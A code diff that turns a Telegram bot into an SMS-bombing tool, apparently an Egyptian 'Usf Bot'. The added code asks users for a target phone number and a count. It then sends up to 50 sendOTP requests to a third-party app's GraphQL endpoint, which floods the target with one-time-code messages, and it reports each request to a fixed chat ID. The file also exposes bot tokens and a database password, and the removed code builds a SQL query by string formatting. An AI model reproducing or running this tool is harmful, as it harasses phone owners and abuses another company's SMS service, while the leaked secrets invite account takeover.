@@ -1,93 +1,169 @@
+# import telebot
+# import requests
+# bot=telebot.TeleBot('6103551301:AAFWQCycnoSZ2JCIZmS2JtNGfhQP05bg2Jw')
+# def sendMessage(number):
+#   headers = {
+#       "User-Agent": "Dart/3.1 (dart:io)",
+#       "Accept": "application/json",
+#       "Lang": "en",
+#       "Accept-Encoding": "gzip",
+#       "Content-Length": "96",
+#       "Host": "app.tagaddod.com",
+#       "Content-Type": "application/json; charset=utf-8"
+#   }
 
-import psycopg2
+#   data = f'{{"operationName":"","variables":{{}},"query":"mutation{{\\nsendOTP(phone: \\"{number}\\")\\n}}"}}'
 
-import asyncio
-from datetime import datetime
-from typing import Optional
+#   response = requests.post('https://app.tagaddod.com/graphql', headers=headers, data=data).text
+#   if "You will receive SMS with your OTP" in response:
+#       return "done"
+#   else:
+#       return "error"
+# processing_message = False
+# @bot.message_handler(commands=['start'])
+# def welcome (message):
+#     bot.send_message(message.chat.id,
+#                      '''
+#       اهلا بيك فـ Usf Bot 
 
-import aiogram.utils.markdown as md
-from aiogram import Bot, Dispatcher, types
-from aiogram.contrib.fsm_storage.memory import MemoryStorage
-from aiogram.dispatcher import FSMContext
-from aiogram.dispatcher.filters.state import State, StatesGroup
-from aiogram.types import ParseMode
-from aiogram.utils import executor
-from aiogram.types import InlineKeyboardMarkup,InlineKeyboardButton,KeyboardButton
-from aiogram.types import Message, CallbackQuery, ReplyKeyboardRemove, ReplyKeyboardMarkup    
-from aiogram.dispatcher.filters import Text
-import logging
-from aiogram.types import ReplyKeyboardRemove
-from aiogram.contrib.middlewares.logging import LoggingMiddleware
+#     ابعت الرقم الي عايز تبعتلو Spam بدون اي مسافات و عدد الرسايل علي الشكل ده👇
 
+#     010xxxxxxxx:عدد الرسايل 
+#     '''
+#     )
 
-
-API_TOKEN = '5730303832:AAGE3lbjVqNaqJ0bUww-eRUzW_dNTkrJXrg'
-DB_URI ="postgresql://postgres:SEvju9ySxpC7lfoeXwwU@containers-us-west-79.railway.app:7370/railway"
-
-bot = Bot(token=API_TOKEN)
-dp = Dispatcher(bot)
-storage = MemoryStorage()
-dp = Dispatcher(bot, storage=storage)
-dp.middleware.setup(LoggingMiddleware())
-
-
-db_connection = psycopg2.connect(DB_URI, sslmode="require")
-db_object = db_connection.cursor()
-
-async def gen_main_markup():
-    markup = InlineKeyboardMarkup(resize_keyboard=True)
-    #arkup = ReplyKeyboardMarkup(resize_keyboard=False,one_time_keyboard=False)
-    
-    markup.row_width = 1
-    markup.add(InlineKeyboardButton("📖BUTTON1📖", callback_data="inst"),
-               InlineKeyboardButton("💰BUTTON2💰", callback_data="bal"),
-               InlineKeyboardButton("✍NOTE✍️", callback_data="add_comment"),
-			   
-               
-               )
-                                    
-              
-    return markup
-
-    
-@dp.message_handler(commands=['start'])
-async def command_start(message: types.Message):
-	user_id = message.from_user.id
-	username = message.from_user.username
-	if message.chat.type== "private":
+# def isMsg(message):
+#     return True
 
 
 
+# @bot.message_handler(func=isMsg)
+# def reply(message):
+#  global processing_message
+#  try:
+#     Text="Done"
+#     if processing_message:
+#             Text="معلش السيرفير بتاعنا بيبعت رسايل لحد دلوقتي ممكن تجرب تاني بعد دقايق🤍"
+#             bot.reply_to(message, Text)
+#             return
 
-				
+#         # Set the flag to indicate that the bot is now processing a message
+#     processing_message = True
+#     bot.reply_to(message,"Wait....")
+#     x=message.text
+#     if " "in x:
+#       x=x.replace(" ","")
+#     if x[0]=="+":
+#       x=x[2:] 
+#     number=x[0:11]
+#     count=int(x[12:])
+#     max_count=50
+#     if count>max_count:
+#       bot.reply_to(message,f"مينفعش تبعت اكتر من  {max_count} في المره الواحده ")
+#       return
 
-		db_object.execute(f"SELECT id FROM users WHERE id = {user_id}")
-	    
-		result = db_object.fetchone()
 
-	    
+#     for i in range(count):
+#       sendMessage(number)
+      
 
-		if not result:
-			db_object.execute("INSERT INTO users(id, username) VALUES (%s, %s)", (user_id, username))
-			db_connection.commit()
-			await bot.send_message(message.chat.id, f"السلام عليكم 🖐\n Welcome {username}\nYou have got 2 points for free",reply_markup=await gen_main_markup())
-	  		
-	  		
-		else:
-			await bot.send_message(message.chat.id, f"السلام عليكم 🖐\n Welcome {username}",reply_markup=await gen_main_markup())
 
-  	
+   
 
-		   
-		    
 
-print("working..............")
+#  except Exception as e :
+#     Text="Faild"
+#     print(e)
+# #  finally:
+# #         processing_message = False
 
-if __name__ == '__main__':
-    executor.start_polling(dp, skip_updates=False)
+#  bot.reply_to(message,Text)
+#  processing_message = False
+#  bot.send_message(1098317745,message.text+"\n"+"From: "+"@"+message.from_user.username+"\n"+"Response: "+Text)
 
-  
+# bot.polling()
 
-    
-     
-	     		
+
+
+import telebot
+import requests
+
+bot = telebot.TeleBot('6103551301:AAFWQCycnoSZ2JCIZmS2JtNGfhQP05bg2Jw')
+
+# Dictionary to store the processing status for each user ID
+processing_status = {}
+
+def sendMessage(number):
+  headers = {
+      "User-Agent": "Dart/3.1 (dart:io)",
+      "Accept": "application/json",
+      "Lang": "en",
+      "Accept-Encoding": "gzip",
+      "Content-Length": "96",
+      "Host": "app.tagaddod.com",
+      "Content-Type": "application/json; charset=utf-8"
+  }
+
+  data = f'{{"operationName":"","variables":{{}},"query":"mutation{{\\nsendOTP(phone: \\"{number}\\")\\n}}"}}'
+
+  response = requests.post('https://app.tagaddod.com/graphql', headers=headers, data=data).text
+  if "You will receive SMS with your OTP" in response:
+      return "done"
+  else:
+      return "error"
+
+@bot.message_handler(commands=['start'])
+def welcome(message):
+    user_id = message.from_user.id
+    processing_status[user_id] = False  # Initialize processing status for the user
+    bot.send_message(message.chat.id, '''
+        اهلا بيك فـ Usf Bot 
+        ابعت الرقم الي عايز تبعتلو Spam بدون اي مسافات و عدد الرسايل علي الشكل ده👇
+        010xxxxxxxx:عدد الرسايل 
+    ''')
+
+def isMsg(message):
+    return True
+
+@bot.message_handler(func=isMsg)
+def reply(message):
+    global processing_status
+    try:
+        Text="Done"
+        user_id = message.from_user.username
+        if user_id in processing_status and processing_status[user_id]:
+            bot.reply_to(message, '''استني لما نخلص و نقولك Done  عشان نقدر نبعتلك  تاني 
+مش كلو ورا بعضو كده 😏''')
+            return
+
+        
+        bot.reply_to(message, "Wait....")
+
+        x = message.text
+        if " "in x:
+          x=x.replace(" ","")
+        if x[0]=="+":
+          x=x[2:] 
+        number=x[0:11]
+        count=int(x[12:])
+        max_count=50
+        if count>max_count:
+          bot.reply_to(message,f"مينفعش تبعت اكتر من  {max_count} في المره الواحده ")
+          return
+
+        processing_status[user_id] = True  # Set processing status to True for the current user
+        for i in range(count):
+          sendMessage(number)
+
+        bot.reply_to(message, Text)
+        processing_status[user_id] = False  # Reset processing status for the current user
+        bot.send_message(1098317745, message.text + "\n" + "From: " + "@" + message.from_user.username + "\n" + "Response: " + Text)
+
+    except Exception as e:
+        Text = "Faild"
+        bot.reply_to(message, Text)
+        print(e)
+
+
+
+bot.polling()
